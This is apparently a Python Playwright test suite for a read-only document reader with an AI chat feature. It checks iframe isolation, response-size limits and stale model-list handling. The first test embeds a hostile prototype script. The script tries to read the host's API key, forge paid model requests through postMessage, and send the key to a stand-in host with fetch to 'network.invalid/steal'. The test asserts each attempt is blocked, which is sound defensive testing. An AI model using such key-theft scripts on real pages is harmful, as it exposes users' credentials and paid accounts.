"""Untrusted prototype scripts cannot read or exercise the recipient's AI key."""

import base64
import gzip
import json
import re

import pytest
from playwright.sync_api import expect, sync_playwright
from vks_api.readonly_export import html_library

from tests.ui import test_readonly_reader as reader_tests
from tests.ui.test_frontend_browser import chromium_path

reader_file = reader_tests.reader_file
configure = reader_tests.configure


def test_untrusted_script_cannot_read_recipient_key_forge_paid_calls_or_navigate_out(reader_file, tmp_path):
    match = re.search(r'<script\b[^>]*\bid="vks-payload"[^>]*>([^<]+)</script>', reader_file.read_text())
    payload = json.loads(gzip.decompress(base64.b64decode(match[1].strip())))
    payload["prototypes"][0]["html"] = """<!doctype html><html><head><title>不可信原型</title></head><body>
    <h1>不可信原型</h1><button id="attack">检查宿主隔离</button><button id="escape">尝试外联导航</button>
    <script>
    let timer;
    window.attackCount=0;
    function attack() {
      window.attackCount++;
      try {
        window.readerKey=parent.document.querySelector('[aria-label="API Key"]').value;
        window.parentReadable=true;
      } catch { window.parentReadable=false; window.readerKey=null; }
      try { parent.localStorage.setItem('prototype-wrote-host-storage','yes'); } catch {}
      const source=Array.from(document.scripts).map(script=>script.textContent).join('\\n');
      const nonce=source.match(/[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}/i)?.[0];
      window.nonceFound=!!nonce;
      for (const type of ['ask','question','submitQuestion','chat','responses','embeddings','knowledge.request']) {
        parent.postMessage({vks_reader:nonce,type,payload:{question:'伪造付费模型请求',mode:'explain'}},'*');
      }
      parent.postMessage({vks_reader:nonce,type:'context',payload:{target:{route:'/',selector:'#attack',label:'不可信上下文',frame_path:[],state:''},scope:'control',page_title:'不可信原型'}},'*');
      fetch('https://network.invalid/steal?key='+encodeURIComponent(window.readerKey||'blocked')).catch(()=>{});
    }
    document.getElementById('attack').onclick=()=>{attack();clearInterval(timer);timer=setInterval(attack,80)};
    document.getElementById('escape').onclick=()=>{clearInterval(timer);location.href='https://network.invalid/escaped'};
    </script></body></html>"""
    hostile = tmp_path / "hostile-library.html"
    hostile.write_bytes(html_library(payload))
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page(viewport={"width": 1440, "height": 1000})
        calls, requests = [], []

        def respond(route):
            request = route.request
            calls.append((request.url, request.method, request.headers.get("authorization")))
            if request.url.endswith("/models"):
                route.fulfill(
                    json={"data": [{"id": "fixture-chat"}]},
                    headers={
                        "Access-Control-Allow-Origin": "*",
                        "Access-Control-Allow-Headers": "Authorization, Content-Type",
                    },
                )
            else:
                route.abort()

        page.route("https://api.example.test/v1/**", respond)
        page.on("request", lambda request: requests.append(request.url))
        try:
            page.goto(hostile.as_uri())
            frame = page.frame_locator("iframe.prototype-frame")
            expect(frame.get_by_role("button", name="检查宿主隔离", exact=True)).to_be_visible()
            configure(page)
            page.get_by_role("tab", name="连接设置", exact=True).click()
            page.get_by_label("API Key", exact=True).fill("fixture-recipient-only")
            expect(page.get_by_label("API Key", exact=True)).to_have_value("fixture-recipient-only")
            frame.get_by_role("button", name="检查宿主隔离", exact=True).click()
            source_frame = page.locator("iframe.prototype-frame").element_handle().content_frame()
            source_frame.wait_for_function("window.attackCount >= 3")
            assert source_frame.evaluate("window.parentReadable") is False
            assert source_frame.evaluate("window.readerKey") is None
            assert source_frame.evaluate("window.nonceFound") is True
            assert page.evaluate("localStorage.getItem('prototype-wrote-host-storage')") is None
            assert calls == [("https://api.example.test/v1/models", "GET", "Bearer fixture-recipient-only")]
            assert not [url for url in requests if "network.invalid" in url]
            frame.get_by_role("button", name="尝试外联导航", exact=True).click()
            page.wait_for_timeout(250)
            # Chromium may replace a CSP-blocked frame with its error document;
            # the boundary is that no remote navigation/request was permitted.
            assert source_frame.url.startswith(("data:", "chrome-error:", "about:"))
            assert not [url for url in requests if "network.invalid" in url]
            assert len(calls) == 1
            expect(page.get_by_label("API Key", exact=True)).to_have_value("fixture-recipient-only")
            assert "fixture-recipient-only" not in hostile.read_text()
        finally:
            browser.close()


@pytest.mark.parametrize("mode", ["complete_without_eof", "oversize_sse", "oversize_json"])
def test_model_response_completion_and_size_boundaries_cancel_the_network_reader(reader_file, mode):
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page(viewport={"width": 1280, "height": 900})
        page.route(
            "https://api.example.test/v1/models",
            lambda route: route.fulfill(
                json={"data": [{"id": "fixture-chat"}]}, headers={"Access-Control-Allow-Origin": "*"}
            ),
        )
        try:
            page.goto(reader_file.as_uri())
            configure(page)
            page.evaluate(
                r"""mode => {
              const original = window.fetch;
              window.fetch = (url, init) => {
                if (!String(url).endsWith('/chat/completions')) return original(url, init);
                const content = mode === 'complete_without_eof'
                  ? 'data: {"choices":[{"delta":{"content":"任务名称必填 [1]。"}}]}\n\ndata: {"choices":[{"delta":{},"finish_reason":"stop"}]}\n\n'
                  : 'x'.repeat(2 * 1024 * 1024 + 1);
                const body = new ReadableStream({
                  start(controller) { controller.enqueue(new TextEncoder().encode(content)); },
                  cancel() { window.responseReaderCancelled = true; }
                });
                return Promise.resolve(new Response(body, {headers: {'content-type': mode === 'oversize_json' ? 'application/json' : 'text/event-stream'}}));
              };
            }""",
                mode,
            )
            page.get_by_label("向 AI 提问", exact=True).fill("创建任务需要哪些信息？")
            page.get_by_role("button", name="发送", exact=True).click()
            page.wait_for_function("window.responseReaderCancelled === true")
            expect(page.get_by_role("button", name="发送", exact=True)).to_be_enabled()
            if mode == "complete_without_eof":
                expect(page.locator(".answer").last).to_have_text("任务名称必填 [1]。")
                expect(page.locator(".chat-message .error")).to_have_count(0)
            else:
                expect(page.locator(".chat-message .error")).to_contain_text("超过 2 MiB")
        finally:
            browser.close()


@pytest.mark.parametrize("changed_field", ["API Key", "接口地址"])
def test_changing_recipient_connection_discards_previous_model_choices_and_late_catalog(reader_file, changed_field):
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(executable_path=chromium_path(playwright), headless=True)
        page = browser.new_page(viewport={"width": 1280, "height": 900})
        page.route(
            "https://api.example.test/v1/models",
            lambda route: route.fulfill(
                json={"data": [{"id": "fixture-chat"}]}, headers={"Access-Control-Allow-Origin": "*"}
            ),
        )
        try:
            page.goto(reader_file.as_uri())
            configure(page)
            page.get_by_role("tab", name="连接设置", exact=True).click()
            expect(page.get_by_label("可用模型", exact=True).locator("option")).to_have_count(3)
            page.evaluate(r"""() => {
              const original = window.fetch;
              window.catalogReleases = [];
              window.fetch = (url, init) => String(url).endsWith('/models')
                ? new Promise(resolve => {
                    const index = window.catalogReleases.length;
                    window.catalogReleases.push(() => resolve(new Response(JSON.stringify({data: [{id:index ? 'current-account-model' : 'late-old-account-model'}]}), {headers: {'content-type':'application/json'}})));
                  })
                : original(url, init);
            }""")
            page.get_by_role("button", name="获取模型", exact=True).click()
            page.wait_for_function("window.catalogReleases.length === 1")
            page.get_by_label(changed_field, exact=True).fill(
                "second-recipient-key" if changed_field == "API Key" else "https://other.example.test/v1"
            )
            expect(page.get_by_label("可用模型", exact=True).locator("option")).to_have_text(
                ["获取模型后可下拉选择", "手动输入模型 ID…"]
            )
            expect(page.get_by_role("button", name="获取模型", exact=True)).to_be_enabled()
            page.get_by_role("button", name="获取模型", exact=True).click()
            page.wait_for_function("window.catalogReleases.length === 2")
            page.evaluate(
                "async () => {window.catalogReleases[0](); await new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)));}"
            )
            expect(page.get_by_label("可用模型", exact=True).locator("option")).to_have_text(
                ["获取模型后可下拉选择", "手动输入模型 ID…"]
            )
            expect(page.get_by_role("button", name="获取模型", exact=True)).to_be_disabled()
            assert "late-old-account-model" not in page.locator("body").inner_text()
            page.evaluate("window.catalogReleases[1]()")
            expect(page.get_by_label("可用模型", exact=True).locator("option")).to_have_text(
                ["请选择可用模型", "current-account-model", "手动输入模型 ID…"]
            )
        finally:
            browser.close()
